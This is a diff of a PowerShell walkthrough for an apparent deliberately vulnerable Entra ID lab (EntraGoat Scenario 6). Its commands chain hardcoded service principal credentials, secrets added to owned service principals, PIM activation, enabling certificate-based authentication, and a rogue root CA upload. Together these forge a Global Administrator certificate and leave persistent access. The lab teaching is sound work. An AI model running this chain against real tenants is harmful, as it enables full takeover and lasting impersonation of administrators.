@@ -6,24 +6,28 @@ EntraGoat Scenario 6: Walkthrough solution step-by-step
 ________________________________________________________________________________________________________________________________________________
 Scenario 6 - CBA (Certificate Bypass Authority) - Root Access Granted
 
+# Official blog post: https://www.semperis.com/blog/exploiting-certificate-based-authentication-in-entra-id/
+
 Attack flow:
 
 1. The attacker discovers hardcoded credentials for a legacy automation service principal.
 This SP has Policy.ReadWrite.AuthenticationMethod permission - seems harmless, right?
 
 2. Through enumeration, the attacker discovers this legacy SP owns other service principals.
-Ownership means the ability to add credentials and impersonate those SPs (as seen in Scenario 1).
+Ownership means the ability to add credentials and authenticating as the SP (as seen in Scenario 1).
 
-3. One owned SP (DataSync) has Organization.ReadWrite.All - the ability to modify tenant settings.
-Another owned SP (AuthPolicy) has Authentication Policy Administrator role.
+3. The second service principal has Organization.ReadWrite.All permission. 
+While not capable of managing users or roles, this permission allows modification of tenant-wide configurations, including authentication settings.
 
-4. The attacker chains these permissions: Legacy SP -> DataSync SP -> Enable CBA + Add Root CA.
-This creates a federated trust with an attacker-controlled Certificate Authority.
+4. The terence.mckenna user is found to be PIM-eligible for a group that holds the Authentication Policy Administrator role. 
+After activating membership, the attacker enables CBA across the tenant.
 
-5. With CBA enabled and a malicious root CA trusted, the attacker can create certificates
-for ANY user in the tenant, including Global Administrators.
+5. The attacker uploads a rogue root CA certificate, making it a trusted certificate authority for authentication purposes.
 
-6. The attacker authenticates as the GA using only a certificate - no password needed.
+6. With CBA enabled and a malicious root CA trusted, the attacker can create certificates
+for ANY user in the tenant, including the Global Administrator user, EntraGoat-admin-s6.
+
+7. The attacker authenticates as the GA using a certificate - no password needed.
 This persists through password resets and might not trigger typical authentication alerts.
 
 - - -
@@ -32,31 +36,22 @@ This persists through password resets and might not trigger typical authenticati
 This attack exploits several Entra ID design decisions and common misconfigurations:
 
 1. Service Principal ownership: SP ownership grants credential management rights.
-   Many organizations don't audit SP ownership chains or realize the implications.
+   Some organizations don't audit SP ownership chains or realize the implications.
 
 2. Compound permissions: The attack requires multiple permissions that seem benign alone:
-   - Policy.ReadWrite.AuthenticationMethod (configure auth methods)
-   - Organization.ReadWrite.All (modify tenant settings)
-   Together, they enable CBA configuration without GA rights.
+   - Organization.ReadWrite.All - grants the ability to modify org-wide configuration settings.
+   - Authentication Policy Administrator (or Policy.ReadWrite.AuthenticationMethod) - enables and configures CBA.
 
 3. Certificate-Based Authentication: CBA pierces the tenant's trust boundary.
-   Once configured, the external CA becomes an alternative identity provider.
-   On certain configurations, there's no way to differentiate cert-based logins from password logins in logs.
+   Once configured, the external CA becomes a valid identity issuer for any user in the tenant.
 
-4. Legacy (automation) debt: Old SPs accumulate permissions over time.
-   "Legacy" SPs often have excessive permissions and ownership of newer SPs.
+4. Legacy automation debt: Old SPs accumulate permissions over time.
    Credentials get embedded in scripts and might be forgotten once "everything works".
 
 Common scenarios where this happens:
-- DevOps teams create automation SPs that accumulate permissions
 - SPs created for POCs become production dependencies
+- DevOps teams create automation SPs that accumulate permissions
 - Ownership chains form when SPs create other SPs programmatically
-
-The attack is particularly dangerous because:
-- Each step uses legitimate APIs and permissions
-- No Global Admin actions are performed until the final impersonation
-- The persistence mechanism (root CA) survives password resets
-- Detection requires correlating multiple disparate logs
 ________________________________________________________________________________________________________________________________________________
 
 .NOTES
@@ -101,13 +96,11 @@ function Find-OwnedServicePrincipals {
     return $ownedSPs
 }
 
-
+# Check directory role assignments for a given SP
 function Get-ServicePrincipalRoles {
     param([object]$ServicePrincipal)
     
     Write-Host "Checking roles for: $($ServicePrincipal.DisplayName)"
-    
-    # Check directory role assignments for the service principal
     $roleAssignments = Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($ServicePrincipal.Id)'" -ErrorAction SilentlyContinue
     $roles = @()
     
@@ -125,8 +118,7 @@ function Get-ServicePrincipalRoles {
 }
 
 
-
-# Step 1: Authenticate as the Legacy Automation Service Principal we have creds for
+# Step 1: Initial foothold with hardcoded service principal credentials
 # use leaked credentials from the setup output
 $clientId = "[PASTE_LEGACY_APP_ID_HERE]"
 $clientSecret = "[PASTE_LEGACY_CLIENT_SECRET_HERE]"
@@ -140,8 +132,8 @@ Connect-MgGraph -TenantId $tenantId -ClientSecretCredential $credential
 Get-MgContext
 # Scopes - Directory.Read.All and Application.ReadWrite.OwnedBy. Interesting...
 
-# Step 2: Enumeration
-# Get the SP we authenticated as
+# Step 2: Enumeration 
+# Get current SP object info
 $legacySP = Get-MgServicePrincipal -Filter "appId eq '$clientId'"
 $legacySP
 
@@ -158,14 +150,14 @@ $ownedSPs | Format-Table DisplayName, AppId
 # The fancy way:
 $ownedSPs = Find-OwnedServicePrincipals -PrincipalId $legacySP.Id
 
-# owning DataSync-Production SP!
+# owning "DataSync-Production" SP!
 
-# Check what roles this SP has?
+# Let's check what roles the SP has?
 foreach ($sp in $ownedSPs) {
     $roles = Get-ServicePrincipalRoles -ServicePrincipal $sp
 }
 
-# welp, no roles What about permissions?
+# welp, no roles. What about permissions?
 $dataSyncSP = Get-MgServicePrincipal -Filter "displayName eq 'DataSync-Production'"
 $dataSyncPerms = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $dataSyncSP.Id
 foreach ($perm in $dataSyncPerms) {
@@ -173,9 +165,9 @@ foreach ($perm in $dataSyncPerms) {
     $role = $resource.AppRoles | Where-Object { $_.Id -eq $perm.AppRoleId }
     "$($resource.DisplayName): $($role.Value)"
 }
-# Organization.ReadWrite.All - this permission allows this SP to add new ROOT CA to the tenant!
+# Organization.ReadWrite.All - this permission allows this SP to add a shiny brand new Root CA to the tenant!
 
-# Step 3: add backdoor to DataSync SP
+# Step 3: Pivoting to "DataSync-Production" SP
 # the Legacy SP we authenticated as owns that DataSync SP ~AND~ has "Application.ReadWrite.OwnedBy" permission - meaning we can add credentials to SPs we own. 
 $secretDescription = "EntraGoat-Secret-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
 $passwordCredential = @{
@@ -192,7 +184,7 @@ $cba = Get-MgPolicyAuthenticationMethodPolicyAuthenticationMethodConfiguration -
 
 # 403 Error
 
-# even if we authenticate as the DataSync SP, we still can't enable CBA:
+# "DataSync-Production" SP also can't enable CBA:
 Disconnect-MgGraph
 
 $dsSecure = ConvertTo-SecureString -String $dataSyncSecret -AsPlainText -Force
@@ -202,25 +194,26 @@ Connect-MgGraph -TenantId $tenantId -ClientSecretCredential $dsCred
 Get-MgContext
 
 $cba = Get-MgPolicyAuthenticationMethodPolicyAuthenticationMethodConfiguration -AuthenticationMethodConfigurationId "X509Certificate"
-# still 403 Error
+# 403 Error (yet again)
 
-# we have to find a way to enable CBA.
+# To use the root CA attack vector, we first need a method to enable CBA.
 
 Disconnect-MgGraph
 
-# Step 4: Authenticate as the low-privilege user and continue the enumeration
+# Step 4: Shifting focus to user context - This can be done 100% from the Azure portal
+# Authenticate as the low-privilege user and continue the enumeration
 $tenantId = "[YOUR-TENANT-ID]"
 $password = "TheGoatAccess!123"
 $UPN = "terence.mckenna@[YOUR-TENANT-DOMAIN].onmicrosoft.com"
 
-$userToken = Get-MSGraphTokenWithUsernamePassword -Username $UPN -Password $password -TenantID $tenantId
-Connect-MgGraph -AccessToken (ConvertTo-SecureString $userToken.access_token -AsPlainText -Force)
-
+Connect-MgGraph -AccessToken (ConvertTo-SecureString ((Get-MSGraphTokenWithUsernamePassword -Username $UPN -Password $password -TenantID $tenantId).access_token) -AsPlainText -Force)
 
 # basic user enumerations: 
-# what user are we? 
 $currentUser = Get-MgUser -Filter "userPrincipalName eq '$UPN'"
 $currentUser | Select-Object DisplayName, Id, UserPrincipalName, JobTitle
+
+# Check for directory roles (should be empty for this scenario)
+Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($currentUser.Id)'" | Select-Object RoleDefinitionId
 
 # what groups are we a member of (if any)?
 $groupIDs = Get-MgUserMemberOf -UserId $currentUser.Id -All
@@ -228,19 +221,8 @@ foreach ($groupID in $groupIDs) {
     Get-MgGroup -GroupId $groupID.Id
 }
 
-# owned SPs?
-$ownedSPsByUser = Get-MgServicePrincipal -All | Where-Object {
-    $owners = Get-MgServicePrincipalOwner -ServicePrincipalId $_.Id
-    $owners.Id -contains $currentUser.Id
-}
-$ownedSPsByUser | Format-Table DisplayName, AppId
-
-# owned groups?
-$ownedGroupsByUser = Get-MgGroup -All | Where-Object {
-    $owners = Get-MgGroupOwner -GroupId $_.Id
-    $owners.Id -contains $currentUser.Id
-}
-$ownedGroupsByUser | Format-Table DisplayName, Id
+# any owned directory objects by this user? (should be empty)
+Get-MgUserOwnedObject -UserId $currentUser.Id -All
 
 # What about PIM eligible assignments in groups?
 $eligibilities = Invoke-MgGraphRequest -Method GET `
@@ -256,7 +238,7 @@ $eligibilities.value | ForEach-Object {
 # What can this group can do?
 $authGroup = Get-MgGroup -Filter "displayName eq 'Authentication Policy Managers'"
 
-# Check group's roles
+# group's roles
 Get-MgDirectoryRole -All | ForEach-Object {
     $role = $_
     $members = Get-MgDirectoryRoleMember -DirectoryRoleId $role.Id -All
@@ -269,7 +251,7 @@ Get-MgDirectoryRole -All | ForEach-Object {
 
 # those are 2 very powerful roles. with the Auth Policy Admin role, we can enable CBA and with App Admin we can add credentials to any SP.
 
-# Step 5: Activating the PIM membership 
+# Step 5: Activating PIM assignment 
 $activationBody = @{
     accessId = "member"
     principalId = $currentUser.Id
@@ -298,7 +280,7 @@ foreach ($groupID in $groupIDs) {
     Get-MgGroup -GroupId $groupID.Id
 }
 
-# Step 6: Refresh token with policy scope to get new permissions
+# Step 6: might need to refresh our access token
 
 Disconnect-MgGraph
 
@@ -523,20 +505,26 @@ if (-not $uploadSuccess) {
 # Convert to PFX format for Windows installation
 & $opensslBinary pkcs12 -inkey "$adminUPN.key" -in "$adminUPN.crt" -export -out "$adminUPN.pfx" -password pass:EntraGoat123!
 
-# Step 8: Authenticate as Global Admin using the certificate
-# To complete the attack:
-# 1. Install the pfx certificate from: $caWorkspace (password: EntraGoat123!)
-# 2. Navigate to https://portal.azure.com or https://entra.microsoft.com/
-# 3. Enter the admin UPN: $adminUPN
-# 4. When prompted, select the certificate for authentication
 
-# If you get an error about "Certificate validation failed", you probably didn't create/configure/install the client/root CA correctly.
-# BUT 
-# if you get an the pop up of "Stay signed in?" (meaning the cert is valid) and then after clicking yes/no you get the error about
-# "Choose a way to sign in" - it means that Certificate-Based Authentication is enabled BUT its "Default authentication strength" is 
-# set to "Single-factor" and not "Multi-factor". To change the default authentication strength, you can do it from the Entra admin center:
-# Authentication methods -> Policies -> Certificate-based authentication -> Configure -> Under "Authentication binding" change "Default authentication strength" from "Single-Factor" to "Multi-Factor"
-# This also can be accomplished automatically by:
+# Step 8: Authenticate as Global Admin using the certificate
+
+<#
+To complete the attack:
+    1. Install the pfx certificate from: $caWorkspace (password: EntraGoat123!)
+    2. Navigate to https://portal.azure.com or https://entra.microsoft.com/
+    3. Enter the admin UPN: $adminUPN
+    4. When prompted, select the certificate for authentication
+
+If you get an error about "Certificate validation failed", you probably didn't create/configure/install the client/root CA correctly.
+
+BUT 
+
+if you get an the pop up of "Stay signed in?" (meaning the cert is valid) and then after clicking yes/no you get the error about
+"Choose a way to sign in" - it means that Certificate-Based Authentication is enabled BUT its "Default authentication strength" is 
+set to "Single-factor" and not "Multi-factor". To change the default authentication strength, you can do it from the Entra admin center:
+Authentication methods -> Policies -> Certificate-based authentication -> Configure -> Under "Authentication binding" change "Default authentication strength" from "Single-Factor" to "Multi-Factor"
+This also can be accomplished automatically by:
+#>
 
 # Get current config
 $current = Invoke-MgGraphRequest -Method GET -Uri "https://graph.microsoft.com/beta/policies/authenticationmethodspolicy/authenticationMethodConfigurations/X509Certificate"
@@ -569,13 +557,13 @@ Invoke-MgGraphRequest -Method PATCH -Uri "https://graph.microsoft.com/beta/polic
 $updated = Invoke-MgGraphRequest -Method GET -Uri "https://graph.microsoft.com/beta/policies/authenticationmethodspolicy/authenticationMethodConfigurations/X509Certificate"
 $updated.authenticationModeConfiguration.x509CertificateAuthenticationDefaultMode
 
+# the root CA can be remained in the tenant for persistence purposes and any user certificate signed by the CA will be able to authenticate
 
-
-# Cleanup certificates from local store
-Write-Host "`n[*] Cleaning up local certificates..." -ForegroundColor Yellow
+# Consider: cleanup certificates from local store by the following commands
 Remove-Item -Path "Cert:\CurrentUser\My\$($rootCA.Thumbprint)" -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "Cert:\CurrentUser\My\$($clientCert.Thumbprint)" -Force -ErrorAction SilentlyContinue
 
-Write-Host "[+] Exploitation complete!" -ForegroundColor Green
-Write-Host "[!] The root CA remains in the tenant for persistence" -ForegroundColor Yellow
-Write-Host "[!] Any user certificate signed by this CA can now authenticate" -ForegroundColor Yellow
+# Don't forget to run the cleanup script to restore the tenant to it's original state!
+# To learn more about how the scenario is created, consider running the setup script with the -Verbose flag and reviewing the its source code.
+
+# Official blog post: https://www.semperis.com/blog/exploiting-certificate-based-authentication-in-entra-id/
